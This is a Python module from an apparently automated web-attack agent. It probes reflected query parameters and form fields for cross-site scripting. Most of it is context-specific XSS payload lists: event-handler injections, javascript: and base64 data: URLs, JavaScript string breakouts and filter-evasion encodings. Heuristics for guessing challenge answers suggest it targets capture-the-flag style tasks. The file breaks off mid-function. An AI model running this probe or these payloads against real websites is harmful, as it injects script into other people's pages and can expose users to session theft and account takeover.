from __future__ import annotations

import base64
import html
import json
import re
from urllib.parse import urlsplit

from ravage.agent_core.agent_state import AgentState
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    compare_responses,
    form_defaults,
    inject_query_param,
    response_secrets,
)
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probe_suite_parts.support import (
    _dedupe,
    _form_input_names,
    _form_targets,
    _int_value,
    _parameter_targets,
    _string_items,
)
from ravage.deterministic_agents.xss_payloads import _jsfuck_string_breakout_payloads
from ravage.web_core.proof_recognizer import recognize_proofs

_TARGET_LIMIT = 2
_VALUE_LIMIT = 4
_XSS_SENTINEL_LIMIT = 28
_EARLY_CONTEXT_XSS_SENTINEL_LIMIT = 6
_REQUEST_BUDGET = 34
_BRANCH_TIMEOUT_SECONDS = 8
_VALUE_GATE_VALUE_LIMIT = 6
_EXPECTED_VALUE_PATTERNS = (
    re.compile(r"\binstead of\s+[\"'`]([^\"'`<>\r\n]{1,80})[\"'`]", re.IGNORECASE),
    re.compile(
        r"\bexpected(?:\s+(?:alert|dialog|value|token|text|result|output))?"
        r"\s*(?:is|was|=|:)?\s*[\"'`]([^\"'`<>\r\n]{1,80})[\"'`]",
        re.IGNORECASE,
    ),
    re.compile(r"\bshould\s+(?:alert|equal|be|return)\s+[\"'`]([^\"'`<>\r\n]{1,80})[\"'`]", re.IGNORECASE),
    re.compile(r"\binstead of\s+([A-Za-z0-9_-]{3,40})\b", re.IGNORECASE),
)
_VALUE_GATE_MARKERS = (
    "instead of",
    "expected value",
    "expected alert",
    "expected dialog",
    "wrong value",
    "incorrect value",
    "did an alert",
)
_ALERT_VALUE_GATE_MARKERS = (
    "did an alert",
    "alert with",
    "expected alert",
)

_XSS_PROOF_TOKENS = ("XSS", "SUCCESS")
_XSS_LITERAL_DIALOG_ARGUMENTS = ("1",)
_XSS_TOKEN_EXPRESSIONS = {
    "XSS": "String.fromCharCode(88,83,83)",
    "SUCCESS": "String.fromCharCode(83,85,67,67,69,83,83)",
}


def probe_reflection_value_boundary(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    _branch_timeout = min(max(session.timeout_seconds, _BRANCH_TIMEOUT_SECONDS), 12)
    fork_session = getattr(session, "fork", None)
    if callable(fork_session):
        branch_session = fork_session(timeout_seconds=_branch_timeout)
    else:
        _branch_headers = getattr(session, "default_headers", None)
        if _branch_headers:
            branch_session = ProbeSession(
                session.target_url,
                timeout_seconds=_branch_timeout,
                default_headers=_branch_headers,
            )
        else:
            branch_session = ProbeSession(session.target_url, timeout_seconds=_branch_timeout)
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    budget = _REQUEST_BUDGET
    targets = _selected_reflection_targets(_reflection_value_targets(state))
    baselines: list[tuple[dict[str, object], ProbeResponse]] = []
    for target in targets:
        if budget <= 0:
            break
        baseline = _send_target(branch_session, target, _baseline_value(target))
        budget -= 1
        requests.append(
            baseline.summary(body_chars=260)
            | {
                "probe_kind": "reflection_value_baseline",
                "target": _target_brief(target),
            }
        )
        baselines.append((target, baseline))
    for target, baseline in baselines:
        if budget <= 0:
            break
        target_contexts = _target_contexts(target, state)
        input_name = str(target.get("input") or "")
        early_xss_values: list[str] = []
        if target_contexts:
            early_xss_values = _xss_sentinel_payloads(
                target_contexts,
                input_name=input_name,
            )[:_EARLY_CONTEXT_XSS_SENTINEL_LIMIT]
            for value in early_xss_values:
                if budget <= 0:
                    break
                budget -= 1
                finding = _probe_value(
                    branch_session,
                    target,
                    baseline,
                    value,
                    requests,
                    probe_kind="reflection_value_xss_sentinel",
                )
                if finding:
                    findings.append(finding)
                    if finding["type"] in {"reflection_value_proof", "reflection_value_timeout"}:
                        break
        if _has_terminal_finding(findings):
            break
        for value in _priority_dialog_values(baseline.body):
            if budget <= 0:
                break
            budget -= 1
            finding = _probe_value(
                branch_session,
                target,
                baseline,
                value,
                requests,
                probe_kind="reflection_value_dialog",
            )
            if finding:
                findings.append(finding)
                if finding["type"] in {"reflection_value_proof", "reflection_value_timeout"}:
                    break
        if _has_terminal_finding(findings):
            break
        for value in _priority_plain_values(baseline.body):
            if budget <= 0:
                break
            budget -= 1
            finding = _probe_value(
                branch_session,
                target,
                baseline,
                value,
                requests,
                probe_kind="reflection_value_expected",
            )
            if finding:
                findings.append(finding)
                if finding["type"] in {"reflection_value_proof", "reflection_value_timeout"}:
                    break
        if _has_terminal_finding(findings):
            break
    
        for value in _xss_sentinel_payloads(
            target_contexts,
            input_name=input_name,
        ):
            if value in early_xss_values:
                continue
            if budget <= 0:
                break
            budget -= 1
            finding = _probe_value(
                branch_session,
                target,
                baseline,
                value,
                requests,
                probe_kind="reflection_value_xss_sentinel",
            )
            if finding:
                findings.append(finding)
                if finding["type"] in {"reflection_value_proof", "reflection_value_timeout"}:
                    break
        if _has_terminal_finding(findings):
            break
    if not _has_terminal_finding(findings):
        for target, baseline in baselines:
            if budget <= 0:
                break
            context_text = baseline.body
            for value in _candidate_values(context_text):
                if budget <= 0:
                    break
                budget -= 1
                finding = _probe_value(
                    branch_session,
                    target,
                    baseline,
                    value,
                    requests,
                    probe_kind="reflection_value_candidate",
                )
                if finding:
                    findings.append(finding)
                    if finding["type"] in {"reflection_value_proof", "reflection_value_timeout"}:
                        break
            if _has_terminal_finding(findings):
                break
    return ProbeRunResult(
        ok=bool(findings),
        probe="reflection_value_boundary",
        summary=(
            f"tested {len(targets)} reflected-value target(s), "
            f"requests={_REQUEST_BUDGET - budget}, findings={len(findings)}"
        ),
        findings=_prioritized_findings(findings)[:20],
        requests=requests[:80],
    )


def _probe_value(
    session: ProbeSession,
    target: dict[str, object],
    baseline: ProbeResponse,
    value: str,
    requests: list[dict[str, object]],
    *,
    probe_kind: str,
) -> dict[str, object]:
    response = _send_target(session, target, value)
    requests.append(
        response.summary(body_chars=360)
        | {
            "probe_kind": probe_kind,
            "target": _target_brief(target),
            "value": value,
        }
    )
    return _value_finding(target, baseline, response, value)


def _xss_sentinel_payloads(
    contexts: list[dict[str, object]] | None = None,
    *,
    input_name: str = "",
) -> list[str]:
    context_vectors: list[str] = []
    for context in contexts or []:
        context_vectors.extend(_xss_sentinel_vectors_for_context(context))
    payloads: list[str] = []
    if _input_name_looks_url_sink(input_name) or _contexts_include_iframe_src(contexts or []):
        payloads.extend(_generic_url_dialog_payloads())
    if context_vectors:
        payloads.extend(_context_dialog_payloads_for_vectors(context_vectors))
        payloads.extend(_dialog_checker_payloads(contexts or []))
        payloads.extend(_url_sink_sentinel_payloads(contexts or []))
    else:
        generic_dialog_payloads = _dialog_checker_payloads([])
        payloads.extend(generic_dialog_payloads[:4])
        payloads.extend(_quoted_attribute_focus_fallback_payloads())
        payloads.extend(_quoted_attribute_onerror_fallback_payloads())
        payloads.extend(_jsfuck_string_breakout_payloads("XSS"))
        payloads.extend(_raw_reflection_fallback_payloads())
        payloads.extend(generic_dialog_payloads[4:])
    payloads.extend(_alternate_dialog_payloads_for_vectors(context_vectors))
    payloads.extend(_primary_dialog_payloads_for_vectors(list(_DEFAULT_XSS_SENTINEL_VECTORS)))
    payloads.extend(_alternate_dialog_payloads_for_vectors(list(_DEFAULT_XSS_SENTINEL_VECTORS)))
    return _dedupe(payloads)[:_XSS_SENTINEL_LIMIT]


def _input_name_looks_url_sink(input_name: str) -> bool:
    lowered = input_name.lower()
    return any(token in lowered for token in ("url", "uri", "href", "src", "link", "redirect"))


def _contexts_include_iframe_src(contexts: list[dict[str, object]]) -> bool:
    return any(
        str(context.get("tag_name") or "").lower() == "iframe"
        and str(context.get("attribute_name") or "").lower() == "src"
        for context in contexts
    )


def _generic_url_dialog_payloads() -> list[str]:
    payloads: list[str] = []
    for token in _XSS_PROOF_TOKENS:
        for function_name in ("prompt", "alert", "confirm"):
            literal_call = f"{function_name}('{token}')"
            payloads.extend(
                [
                    f"javascript:{literal_call}",
                    f"java%0ascript:{literal_call}",
                    _data_html_script_url(literal_call),
                ]
            )
    return payloads


def _raw_reflection_fallback_payloads() -> list[str]:
    return [
        'alert("SUCCESS")',
        "alert(`SUCCESS`)",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
    ]


def _quoted_attribute_onerror_fallback_payloads() -> list[str]:
    payloads: list[str] = []
    for token in _XSS_PROOF_TOKENS:
        payloads.extend(
            [
                f"x\" onerror=alert&#40;'{token}'&#41; x=\"",
                f"x\" onerror=alert&#x28;'{token}'&#x29; x=\"",
                f"x' onerror=alert&#40;\"{token}\"&#41; x='",
                f"x' onerror=alert&#x28;\"{token}\"&#x29; x='",
            ]
        )
    return payloads


def _quoted_attribute_focus_fallback_payloads() -> list[str]:
    expression = _XSS_TOKEN_EXPRESSIONS["XSS"]
    return [
        f"x\" autofocus onfocus=alert({expression}) x=\"",
        f"x' autofocus onfocus=alert({expression}) x='",
    ]


def _dialog_checker_payloads(contexts: list[dict[str, object]]) -> list[str]:
    values = ("XSS", "SUCCESS")
    quoted_attribute_payloads: list[str] = []
    html_body_payloads: list[str] = []
    for value in values:
        quoted_attribute_payloads.extend(
            [
                f"\"><svg onload=prompt('{value}')>",
                f"'><svg onload=prompt(\"{value}\")>",
                f"\" autofocus onfocus=prompt('{value}') x=\"",
                f"' autofocus onfocus=prompt(\"{value}\") x='",
            ]
        )
        html_body_payloads.extend(
            [
                f"<svg onload=prompt('{value}')>",
                f"<svg/onload=prompt('{value}')>",
                f"<input autofocus onfocus=prompt('{value}')>",
                f"<details open ontoggle=prompt('{value}')>",
                f"><svg onload=prompt('{value}')>",
                f"><input autofocus onfocus=prompt('{value}')>",
            ]
        )
    if not contexts:
        return _dedupe([*quoted_attribute_payloads, *html_body_payloads])

    payloads: list[str] = []
    for context in contexts:
        name = str(context.get("context") or "")
        quote = str(context.get("quote_char") or '"')
        if name in {"html_body", "html_text", "html_tag", "html_attribute_unquoted"}:
            payloads.extend(quoted_attribute_payloads)
            payloads.extend(html_body_payloads)
        elif name in {"html_attribute_quoted", "attr_double", "attr_single"}:
            quote = quote if quote in {"'", '"'} else '"'
            for value in values:
                payloads.extend(
                    [
                        f"{quote} autofocus onfocus=prompt('{value}') x={quote}",
                        f"{quote}><svg onload=prompt('{value}')>",
                        f"{quote}><input autofocus onfocus=prompt('{value}')>",
                    ]
                )
        elif name in {"js_string_double", "js_double_string"}:
            for value in values:
                payloads.append(f'";prompt("{value}");//')
        elif name in {"js_string_single", "js_single_string"}:
            for value in values:
                payloads.append(f"';prompt('{value}');//")
        elif name in {"js_code", "js_block"}:
            for value in values:
                payloads.append(f"prompt('{value}')")
    return _dedupe(payloads or html_body_payloads)


def _url_sink_sentinel_payloads(contexts: list[dict[str, object]]) -> list[str]:
    if not any(
        _context_is_url_sink(
            str(context.get("context") or ""),
            str(context.get("tag_name") or ""),
            str(context.get("attribute_name") or ""),
        )
        for context in contexts
    ):
        return []
    payloads: list[str] = []
    for token in _XSS_PROOF_TOKENS:
        expression = _XSS_TOKEN_EXPRESSIONS.get(token, token)
        for function_name in ("alert", "confirm", "prompt"):
            literal_call = f"{function_name}('{token}')"
            expression_call = f"{function_name}({expression})"
            payloads.extend(
                [
                    f"javascript:{literal_call}",
                    f"javascript:{expression_call}",
                    f"java%0ascript:{literal_call}",
                    _data_html_script_url(literal_call),
                    _data_html_script_url(expression_call),
                ]
            )
    return payloads


def _data_html_script_url(script: str) -> str:
    html = f"<script>{script}</script>".encode("utf-8")
    encoded = base64.b64encode(html).decode("ascii")
    return f"data:text/html;base64,{encoded}"


def _primary_dialog_payloads_for_vectors(vectors: list[str]) -> list[str]:
    payloads: list[str] = []
    deduped = _dedupe(vectors)
    for token in _XSS_PROOF_TOKENS:
        for vector in deduped:
            payloads.append(_format_dialog_vector(vector, token, _XSS_TOKEN_EXPRESSIONS.get(token, token)))
    for argument in _XSS_LITERAL_DIALOG_ARGUMENTS:
        for vector in deduped:
            payloads.append(_format_literal_dialog_vector(vector, argument, argument))
    return payloads


def _context_dialog_payloads_for_vectors(vectors: list[str]) -> list[str]:
    deduped = _dedupe(vectors)
    payloads: list[str] = []
    for vector in deduped:
        payloads.append(_format_dialog_vector(vector, "XSS", _XSS_TOKEN_EXPRESSIONS["XSS"]))
    for argument in _XSS_LITERAL_DIALOG_ARGUMENTS:
        for vector in deduped:
            payloads.append(_format_literal_dialog_vector(vector, argument, argument))
    for function_name in ("confirm", "prompt"):
        for vector in deduped:
            payloads.append(
                _format_dialog_vector(
                    _replace_dialog_function(vector, function_name),
                    "XSS",
                    _XSS_TOKEN_EXPRESSIONS["XSS"],
                )
            )
    for vector in deduped:
        payloads.append(_format_dialog_vector(vector, "SUCCESS", _XSS_TOKEN_EXPRESSIONS["SUCCESS"]))
    return payloads


def _alternate_dialog_payloads_for_vectors(vectors: list[str]) -> list[str]:
    payloads: list[str] = []
    for vector in _dedupe(vectors):
        for function_name in ("confirm", "prompt"):
            payloads.extend(_dialog_payloads_for_vector(_replace_dialog_function(vector, function_name)))
    return payloads


def _dialog_payloads_for_vector(vector: str) -> list[str]:
    payloads = [
        _format_dialog_vector(vector, token, _XSS_TOKEN_EXPRESSIONS.get(token, token))
        for token in _XSS_PROOF_TOKENS
    ]
    for argument in _XSS_LITERAL_DIALOG_ARGUMENTS:
        payloads.append(_format_literal_dialog_vector(vector, argument, argument))
    return payloads


def _format_dialog_vector(vector: str, token: str, expression: str) -> str:
    return vector.format(t=token, expr=expression)


def _format_literal_dialog_vector(vector: str, argument: str, expression: str) -> str:
    payload = _format_dialog_vector(vector, argument, expression)
    for function_name in ("alert", "confirm", "prompt"):
        for quote in ("'", '"', "`"):
            payload = payload.replace(
                f"{function_name}({quote}{argument}{quote})",
                f"{function_name}({argument})",
            )
    return payload


def _replace_dialog_function(vector: str, function_name: str) -> str:
    return re.sub(r"\balert\(", f"{function_name}(", vector)


def _xss_sentinel_vectors_for_context(context: dict[str, object]) -> list[str]:
    name = str(context.get("context") or "")
    quote_char = str(context.get("quote_char") or "")
    tag_name = str(context.get("tag_name") or "")
    attribute_name = str(context.get("attribute_name") or "")
    if name in {"js_string_double", "js_double_string"} or (not name and quote_char == '"'):
        return [
            "\";alert('{t}');//",
            "\";alert(\"{t}\");//",
            "\";setTimeout(function(){{alert('{t}')}},0);//",
            *_jsfuck_string_breakout_payloads("XSS"),
            *_js_string_filter_safe_vectors('"'),
            *_js_string_escaped_quote_vectors('"'),
            "\";window[String.fromCharCode(97,108,101,114,116)]({expr});//",
            "\";top[String.fromCharCode(97,108,101,114,116)]({expr});//",
            "\";self[String.fromCharCode(97,108,101,114,116)]({expr});//",
        ]
    if name in {"js_string_single", "js_single_string"} or (not name and quote_char == "'"):
        return [
            "';alert(\"{t}\");//",
            "';alert(`{t}`);//",
            "';setTimeout(function(){{alert(\"{t}\")}},0);//",
            *_jsfuck_string_breakout_payloads("XSS"),
            *_js_string_filter_safe_vectors("'"),
            *_js_string_escaped_quote_vectors("'"),
            "';window[String.fromCharCode(97,108,101,114,116)]({expr});//",
            "';top[String.fromCharCode(97,108,101,114,116)]({expr});//",
            "';self[String.fromCharCode(97,108,101,114,116)]({expr});//",
        ]
    if name == "js_string_template":
        return [
            "${{alert('{t}')}}",
            "`;alert('{t}');//",
        ]
    if name in {"js_code", "js_block"}:
        return [
            "alert('{t}')",
            ";alert('{t}');//",
        ]
    if name in {"html_attribute_quoted", "attr_double", "attr_single"}:
        quote = quote_char if quote_char in {"'", '"'} else '"'
        vectors: list[str] = []
        if _attribute_fires_on_error(tag_name, attribute_name):
            vectors.extend(
                [
                    f"x{quote} onerror=alert&#40;'{{t}}'&#41; x={quote}",
                    f"x{quote} onerror=alert&#x28;'{{t}}'&#x29; x={quote}",
                    f"x{quote} onerror=alert`{{t}}` x={quote}",
                ]
            )
        vectors.extend(
            [
                f"{quote} autofocus onfocus=alert(`{{t}}`) x={quote}",
                f"{quote} autofocus onfocus=alert({{expr}}) x={quote}",
                f"{quote} autofocus onfocus=alert&#40;'{{t}}'&#41; x={quote}",
                f"{quote} autofocus onfocus=alert`{{t}}` x={quote}",
                f"{quote}><svg onload=alert('{{t}}')>",
                f"{quote}><svg/onload=alert('{{t}}')>",
                f"{quote}><input autofocus onfocus=alert(\"{{t}}\")>",
                f"{quote}><img src=x onerror=alert('{{t}}')>",
            ]
        )
        return vectors
    if _context_is_url_sink(name, tag_name, attribute_name):
        return [
            "javascript:alert('{t}')",
            "java%0ascript:alert('{t}')",
        ]
    if name in {"html_body", "html_text", "html_tag", "html_attribute_unquoted"}:
        return [
            "<svg onload=alert('{t}')>",
            "<body onload=alert('{t}')>",
            "<image src=x onerror=alert('{t}')>",
            "<style/onload=alert('{t}')>",
            "<svg/onload=alert({expr})>",
            "<img src=x onerror=alert('{t}')>",
            "<input autofocus onfocus=alert(`{t}`)>",
            "<details open ontoggle=alert('{t}')>",
        ]
    if name == "html_comment":
        return [
            "--><svg onload=alert('{t}')>",
            "--><svg/onload=alert('{t}')>",
            "--><input autofocus onfocus=alert(`{t}`)>",
        ]
    return []


def _js_string_filter_safe_vectors(quote: str) -> list[str]:
    if quote not in {"'", '"'}:
        return []
    return [f"{quote};{call};//" for call in _filter_safe_xss_dialog_calls()]


def _js_string_escaped_quote_vectors(quote: str) -> list[str]:
    if quote not in {"'", '"'}:
        return []
    vectors: list[str] = []
    for backslash_count in (1, 3):
        prefix = ("\\" * backslash_count) + quote
        for call in _filter_safe_xss_dialog_calls():
            vectors.append(f"{prefix};{call};//")
    return vectors


def _filter_safe_xss_dialog_calls() -> list[str]:
    return [
        r"alert(`\x58\x53\x53`)",
        r"confirm(`\x58\x53\x53`)",
        r"prompt(`\x58\x53\x53`)",
        r'alert("\x58\x53\x53")',
        r'confirm("\x58\x53\x53")',
        r"setTimeout(alert,0,`\x58\x53\x53`)",
    ]


def _context_is_url_sink(context: str, tag_name: str, attribute_name: str) -> bool:
    if context in {"url_context", "url_attribute", "iframe_src"}:
        return True
    if attribute_name in {"href", "src", "action", "formaction", "xlink:href"}:
        return True
    return tag_name == "iframe" and attribute_name == "src"


def _attribute_fires_on_error(tag_name: str, attribute_name: str) -> bool:
    if tag_name in {"img", "image", "video", "audio", "source", "embed", "object", "iframe"}:
        return True
    return attribute_name in {"src", "poster", "data", "background", "dynsrc", "lowsrc"}


_DEFAULT_XSS_SENTINEL_VECTORS = (
    *_js_string_filter_safe_vectors('"'),
    *_js_string_filter_safe_vectors("'"),
    *_js_string_escaped_quote_vectors('"'),
    *_js_string_escaped_quote_vectors("'"),
    *_jsfuck_string_breakout_payloads("XSS"),
    "\";window[String.fromCharCode(97,108,101,114,116)]({expr});//",
    "';window[String.fromCharCode(97,108,101,114,116)]({expr});//",
    "\";alert('{t}');//",
    "';alert(\"{t}\");//",
    "<svg onload=alert('{t}')>",
    "<body onload=alert('{t}')>",
    "\" onerror=alert&#40;'{t}'&#41; x=\"",
    "<img src=x onerror=alert('{t}')>",
    "<style/onload=alert('{t}')>",
    "<svg/onload=alert({expr})>",
    "<input autofocus onfocus=alert(`{t}`)>",
    "<style/onload=alert({expr})>",
    "<image src=x onerror=alert('{t}')>",
    "<input autofocus onfocus=alert(\"{t}\")>",
    "\"><svg onload=alert('{t}')>",
    "\"><svg/onload=alert('{t}')>",
    "'><svg/onload=alert(\"{t}\")>",
    "<details open ontoggle=alert('{t}')>",
    "</script><svg/onload=alert('{t}')>",
)


def _reflection_value_targets(state: AgentState) -> list[dict[str, object]]:
    reflected_names = _reflected_names(state)
    targets: list[dict[str, object]] = []
    for target in _parameter_targets(state, limit=20):
        name = str(target.get("name") or "")
        if not name:
            continue
        sources = _string_items(target.get("sources"))
        priority = _int_value(target.get("priority"))
        if name in reflected_names:
            priority += 50
        if _form_post_only_sources(sources):
            priority -= 40
        item = {
            "kind": "query_param",
            "url": target.get("url"),
            "input": name,
            "sources": sources,
            "hints": _string_items(target.get("hints")),
            "priority": priority,
        }
        _apply_xss_context_priority(item, state)
        targets.append(item)
    for form in _form_targets(state, limit=8):
   
        method = str(form.get("method") or "GET").upper()
        action = str(form.get("action") or state.surface.get("target_url") or "")
        for input_name in _form_input_names(form):
            priority = 65 if method == "POST" else 45
            if input_name in reflected_names:
                priority += 80
            item = {
                "kind": "form",
                "url": action,
                "input": input_name,
                "form": form,
                "method": method,
                "hints": ["form_input"],
                "priority": priority,
            }
            _apply_xss_context_priority(item, state)
            targets.append(item)
    targets.extend(_targets_from_xss_contexts(state))
    return _ordered_targets(targets)


def _targets_from_xss_contexts(state: AgentState) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    for context in _xss_context_items(state):
        input_name = str(context.get("input") or context.get("name") or "")
        url = str(context.get("url") or "")
        if not input_name or not url:
            continue
        kind = str(context.get("kind") or "query_param")
        raw_form = context.get("form")
        if kind == "form" and isinstance(raw_form, dict):
            form = dict(raw_form)
            method = str(form.get("method") or context.get("method") or "POST").upper()
            targets.append(
                {
                    "kind": "form",
                    "url": str(form.get("action") or url),
                    "input": input_name,
                    "form": form,
                    "method": method,
                    "hints": ["xss_context"],
                    "priority": 280,
                    "xss_context_match": True,
                }
            )
            continue
        targets.append(
            {
                "kind": "query_param",
                "url": url,
                "input": input_name,
                "hints": ["xss_context"],
                "priority": 260,
                "xss_context_match": True,
            }
        )
    return targets


def _apply_xss_context_priority(target: dict[str, object], state: AgentState) -> None:
    if not _target_contexts(target, state):
        return
    bonus = 220 if str(target.get("kind") or "") == "form" else 90
    target["priority"] = _int_value(target.get("priority")) + bonus
    target["xss_context_match"] = True


def _form_post_only_sources(sources: list[str]) -> bool:
    if not sources:
        return False
    lowered = {source.lower() for source in sources}
    if "query" in lowered or "reflection" in lowered:
        return False
    return any(source.startswith("form:post") for source in lowered)


def _reflected_names(state: AgentState) -> set[str]:
    names: set[str] = set()
    for reflection in _list_of_dicts(state.surface.get("reflections")):
        for key in ("name", "parameter", "input"):
            value = str(reflection.get(key) or "")
            if value:
                names.add(value)
    return names


def _selected_reflection_targets(targets: list[dict[str, object]]) -> list[dict[str, object]]:
    if not targets:
        return []
    context_matched = [target for target in targets if target.get("xss_context_match")]
    if context_matched:
        return context_matched[:1]
    selected: list[dict[str, object]] = []
    seen: set[tuple[str, str, str, str]] = set()
    _append_target(selected, seen, targets[0])
    for target in targets:
        if str(target.get("method") or "").upper() == "POST":
            _append_target(selected, seen, target)
            break
    for target in targets:
        if len(selected) >= _TARGET_LIMIT:
            break
        _append_target(selected, seen, target)
    return selected[:_TARGET_LIMIT]


def _append_target(
    selected: list[dict[str, object]],
    seen: set[tuple[str, str, str, str]],
    target: dict[str, object],
) -> None:
    key = _target_identity(target)
    if key in seen:
        return
    seen.add(key)
    selected.append(target)


def _target_identity(target: dict[str, object]) -> tuple[str, str, str, str]:
    return (
        str(target.get("kind") or ""),
        str(target.get("method") or "GET").upper(),
        str(target.get("url") or ""),
        str(target.get("input") or ""),
    )


def _ordered_targets(targets: list[dict[str, object]]) -> list[dict[str, object]]:
    deduped: dict[tuple[str, str, str, str], dict[str, object]] = {}
    for target in targets:
        key = _target_identity(target)
        previous = deduped.get(key)
        if previous is None or _int_value(target.get("priority")) > _int_value(previous.get("priority")):
            deduped[key] = target
    ordered = list(deduped.values())
    ordered.sort(key=_target_sort_key)
    return ordered


def _target_sort_key(target: dict[str, object]) -> tuple[int, str, str, str]:
    return (
        -_int_value(target.get("priority")),
        str(target.get("method") or "GET"),
        str(target.get("url") or ""),
        str(target.get("input") or ""),
    )


def _target_contexts(target: dict[str, object], state: AgentState) -> list[dict[str, object]]:
    contexts: list[dict[str, object]] = []
    for item in _xss_context_items(state):
        if not item or not _context_matches_target(item, target):
            continue
        contexts.append(item)
    return contexts[:6]


def _xss_context_items(state: AgentState) -> list[dict[str, object]]:
    items: list[dict[str, object]] = []
    for raw in state.signals.get("xss_contexts", []):
        item = _json_dict(raw)
        if item:
            items.append(item)
    return items


def _json_dict(raw: object) -> dict[str, object]:
    if isinstance(raw, dict):
        return dict(raw)
    if not isinstance(raw, str):
        return {}
    try:
        decoded = json.loads(raw)
    except json.JSONDecodeError:
        return {}
    return decoded if isinstance(decoded, dict) else {}


def _context_matches_target(context: dict[str, object], target: dict[str, object]) -> bool:
    context_input = str(context.get("input") or context.get("name") or "")
    target_input = str(target.get("input") or "")
    if context_input and target_input and context_input != target_input:
        return False
    context_url = str(context.get("url") or "")
    target_url = str(target.get("url") or "")
    if not context_url or not target_url:
        return True
    return _same_path(context_url, target_url)


def _same_path(left: str, right: str) -> bool:
    left_parts = urlsplit(left)
    right_parts = urlsplit(right)
    if left_parts.netloc and right_parts.netloc and left_parts.netloc != right_parts.netloc:
        return False
    return (left_parts.path or "/") == (right_parts.path or "/")


def _send_target(session: ProbeSession, target: dict[str, object], value: str) -> ProbeResponse:
    kind = str(target.get("kind") or "")
    url = str(target.get("url") or session.target_url)
    input_name = str(target.get("input") or "")
    raw_form = target.get("form")
    if kind == "form" and isinstance(raw_form, dict):
        form = dict(raw_form)
        fields = form_defaults(form, marker_name=input_name, marker=value)
        action = str(form.get("action") or url)
        if str(form.get("method") or "GET").upper() == "POST":
            return session.post_form(action, fields)
        query_url = action
        for name, field_value in fields.items():
            query_url = inject_query_param(query_url, name, field_value)
        return session.get(query_url)
    return session.get(inject_query_param(url, input_name, value))


def _same_origin_static_responses(
    session: ProbeSession,
    baseline: ProbeResponse,
) -> list[ProbeResponse]:
    responses: list[ProbeResponse] = []
    for url in _static_context_urls(session, baseline.body):
        if len(responses) >= 2:
            break
        responses.append(session.get(url))
    return responses


def _static_context_urls(session: ProbeSession, body: str) -> list[str]:
    urls: list[str] = []
    for match in re.finditer(r"""(?:href|src)=['"]([^'"]+)['"]""", body, flags=re.IGNORECASE):
        value = match.group(1)
        if not _looks_like_context_asset(value):
            continue
        url = session.absolute(value)
        if session.in_scope(url):
            urls.append(url)
    return _dedupe(urls)


def _looks_like_context_asset(value: str) -> bool:
    lowered = value.lower().split("?", 1)[0]
    return lowered.endswith((".css", ".js", ".json", ".txt", ".svg", ".png", ".jpg", ".jpeg", ".gif"))


def _candidate_values(text: str) -> list[str]:
    values: list[str] = []
    values.extend(_expected_values_from_text(text))
    if _has_value_gate_text(text):
        values.extend(_XSS_PROOF_TOKENS)
    values.extend(_visual_puzzle_values(text))
    values.extend(_asset_stem_values(text))
    values.extend(_visible_word_values(text))
    values.extend(_case_variants(values[:8]))
    return _dedupe(_clean_candidate_values(values))[:_VALUE_LIMIT]


def _priority_plain_values(text: str) -> list[str]:
    values = _expected_values_from_text(text)
    if not values and _has_value_gate_text(text):
        values.extend(_XSS_PROOF_TOKENS)
    return _dedupe(_clean_candidate_values(values))[:_VALUE_GATE_VALUE_LIMIT]


def _priority_dialog_values(text: str) -> list[str]:
    if not _has_alert_value_gate_text(text):
        return []
    tokens = _expected_values_from_text(text)
    if not tokens:
        tokens.extend(_XSS_PROOF_TOKENS)
    payloads: list[str] = []
    for token in _dedupe(_clean_candidate_values(tokens))[:2]:
        expression = _XSS_TOKEN_EXPRESSIONS.get(token, json.dumps(token))
        payloads.extend(
            [
                f"window[String.fromCharCode(97,108,101,114,116)]({expression})",
                f"alert('{token}')",
                f'alert("{token}")',
                f"alert({expression})",
                f"setTimeout(function(){{alert('{token}')}},0)",
            ]
        )
    return _dedupe(payloads)[:4]


def _expected_values_from_text(text: str) -> list[str]:
    normalized = html.unescape(text)
    values: list[str] = []
    for pattern in _EXPECTED_VALUE_PATTERNS:
        for match in pattern.finditer(normalized):
            values.append(match.group(1))
    return values


def _has_value_gate_text(text: str) -> bool:
    lowered = html.unescape(text).lower()
    return any(marker in lowered for marker in _VALUE_GATE_MARKERS)


def _has_alert_value_gate_text(text: str) -> bool:
    lowered = html.unescape(text).lower()
    return any(marker in lowered for marker in _ALERT_VALUE_GATE_MARKERS)


def _asset_stem_values(text: str) -> list[str]:
    values: list[str] = []
    for match in re.finditer(r"/?([A-Za-z0-9_-]{3,40})\.(?:png|jpg|jpeg|gif|svg|css|js|txt|json)", text):
        stem = match.group(1)
        values.append(stem)
        values.append(stem.replace("_", " "))
        values.append(stem.replace("-", " "))
    return values


def _visible_word_values(text: str) -> list[str]:
    values: list[str] = []
    for match in re.finditer(r"\b[A-Za-z][A-Za-z0-9_-]{2,32}\b", text):
        word = match.group(0)
        if _skip_visible_word(word):
            continue
        values.append(word)
    return values[:80]


def _skip_visible_word(word: str) -> bool:
    lowered = word.lower()
    return lowered in {
        "the",
        "and",
        "for",
        "with",
        "this",
        "that",
        "type",
        "text",
        "name",
        "input",
        "href",
        "src",
        "static",
        "style",
        "script",
        "function",
        "return",
        "error",
        "invalid",
        "incorrect",
        "value",
        "attempting",
        "change",
        "setter",
        "property",
        "unconfigurable",
    }


def _visual_puzzle_values(text: str) -> list[str]:
    lowered = text.lower()
    markers = ("circle", "triangle", "square", "star", "umbrella", "cookie", "shape")
    if not any(marker in lowered for marker in markers):
        return []
    return [
        "circle",
        "triangle",
        "square",
        "star",
        "umbrella",
        "cookie",
    ]


def _case_variants(values: list[str]) -> list[str]:
    variants: list[str] = []
    for value in values:
        variants.append(value.lower())
        variants.append(value.title())
    return variants


def _clean_candidate_values(values: list[str]) -> list[str]:
    cleaned: list[str] = []
    for value in values:
        text = re.sub(r"\s+", " ", value).strip(" -_/.:")
        if len(text) < 3 or len(text) > 40:
            continue
        cleaned.append(text)
    return cleaned


def _value_finding(
    target: dict[str, object],
    baseline: ProbeResponse,
    response: ProbeResponse,
    value: str,
) -> dict[str, object]:
    proofs = recognize_proofs(response.body)
    matches = response_secrets(response)
    if proofs:
        return {
            "type": "reflection_value_proof",
            "input": _target_brief(target),
            "value": value,
            "proofs": proofs,
            "matches": matches,
            "response": response.summary(body_chars=800),
            "replay": _target_replay(target, value),
        }
    if _response_timed_out(response):
        return {
            "type": "reflection_value_timeout",
